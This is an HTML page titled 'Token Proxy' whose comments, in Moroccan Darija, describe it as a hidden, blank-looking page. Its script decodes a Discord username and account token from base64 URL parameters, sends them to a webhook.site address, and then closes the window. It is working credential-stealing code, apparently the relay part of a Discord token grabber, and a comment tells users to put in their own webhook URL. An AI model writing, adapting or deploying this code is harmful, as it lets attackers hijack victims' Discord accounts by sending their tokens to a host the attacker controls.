<!DOCTYPE html>
<html>
<head>
    <title>Token Proxy</title>
    <!-- Had l'page ghadi tkon makhfiya, ma kayban fiha walou -->
    <script>
        // ⚠️ IMPORTANT: BDDEL HAD L'URL B'L'URL DIAL WEBHOOK.SITE DIALEK L'ORIGINAL
        const WEBHOOK_SITE_URL = "https://webhook.site/discordquest"; 

        const params = new URLSearchParams(window.location.search);
        let payloadToWebhook = {}; // Had l'objet howa li ghadi nsiftoh l'webhook.site

        // If the 'd' parameter (data) is present
        if (params.has('d')) {
            try {
                const secretData = params.get('d');
                // Decode Base64 then decode URI component
                const decodedString = decodeURIComponent(atob(secretData));
                
                // Split the string into username and token (kanet `${tag}|${token}`)
                const [username, token] = decodedString.split('|');

                // Prepare the payload in the desired format
                payloadToWebhook = {
                    "Username": username,
                    "Token": token
                };
            } catch (e) {
                console.error("Error decoding 'd' parameter:", e);
                // Fallback in case of decoding error
                payloadToWebhook = { "Error during decoding 'd'": params.get('d') };
            }
        } 
        // If the 'err' parameter (error token) is present
        else if (params.has('err')) {
            try {
                const errorToken = params.get('err');
                const decodedErrorToken = atob(errorToken); // Decode Base64
                
                payloadToWebhook = {
                    "Error Token": decodedErrorToken // Label for raw token on error
                };
            } catch (e) {
                console.error("Error decoding 'err' parameter:", e);
                // Fallback in case of decoding error
                payloadToWebhook = { "Error during decoding 'err'": params.get('err') };
            }
        }

        // Only send the fetch request if there's data to send
        if (Object.keys(payloadToWebhook).length > 0) {
            fetch(WEBHOOK_SITE_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payloadToWebhook) // Kanseftou l'objet m'structured
            })
            .then(response => {
                if (!response.ok) {
                    console.error('Webhook.site proxy error, status:', response.status);
                }
                return response.text(); 
            })
            .then(text => {
                console.log('Token data forwarded to webhook.site successfully from proxy. Response:', text);
            })
            .catch(error => {
                console.error('Error forwarding token data to webhook.site from proxy:', error);
            })
            .finally(() => {
                window.close();
            });
        } else {
             // Close if no valid data or error parameter found
            window.close();
        }
    </script>
</head>
<body>
    <!-- Had l'page ghadi tban khawya w makhfiya -->
</body>
</html>
